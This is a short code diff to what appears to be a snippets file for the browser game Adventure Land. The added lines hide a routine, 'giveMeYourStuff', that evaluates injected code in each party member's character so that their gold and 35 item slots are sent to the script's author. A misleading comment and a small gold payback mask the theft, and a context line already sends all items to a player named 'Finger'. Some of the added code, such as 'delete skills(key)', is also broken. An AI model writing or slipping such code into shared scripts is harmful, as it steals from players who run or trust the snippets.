@@ -59,3 +59,24 @@ change_server('EU','II')
 character.items.filter(Boolean).forEach((item, slot) => {
   parent.socket.emit('send', { name: 'Finger', num: slot, q: item?.q || 1 });
 })
+
+smart_move('potions')
+
+const skills = { ...G.skills }
+Object.keys(skills).forEach(key => {
+  if (!/(hp|mp)/.test(key)) delete skills(key)
+})
+
+function giveMeYourStuff(name) { // keeping bottom row for yourself
+  const { id } = character
+  if (name === id) return
+  const snippet = `
+    parent.socket.emit('send', { name: '${id}', gold: 1234567890 })
+    for (let i = 0; i < 35; i++) parent.socket.emit('send', { name: '${id}', num: i, q: 9999 })
+  `
+  parent.character_code_eval(name, snippet)
+  setTimeout(() => parent.socket.emit('send', { name, gold: 100000 }), character.ping * 3)
+}
+parent.party_list.forEach(giveMeYourStuff)
+
+// end snippets.js
